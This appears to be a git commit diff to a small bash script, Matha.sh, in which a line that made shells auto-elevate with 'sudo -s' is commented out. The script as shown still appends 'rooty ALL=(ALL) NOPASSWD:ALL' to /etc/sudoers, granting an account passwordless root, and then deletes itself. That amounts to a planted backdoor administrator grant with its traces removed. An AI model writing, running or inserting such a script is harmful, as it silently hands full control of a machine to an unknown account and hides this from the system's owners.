f1d33b81dbfa79df112d610cc307e70bbb3c4f45
TeslaSSH <146672794+TeslaSSH@users.noreply.github.com>
2024-03-31 23:08:51 +0300

    Update Matha.sh

--- Matha.sh
+++ Matha.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sed -i '/sudo -s/d' ~/.bashrc
-echo "sudo -s" >> ~/.bashrc
+#echo "sudo -s" >> ~/.bashrc
 sed -i '/rooty ALL=(ALL) NOPASSWD:ALL/d' ~/.bashrc
 echo "rooty ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 rm -f Matha.sh
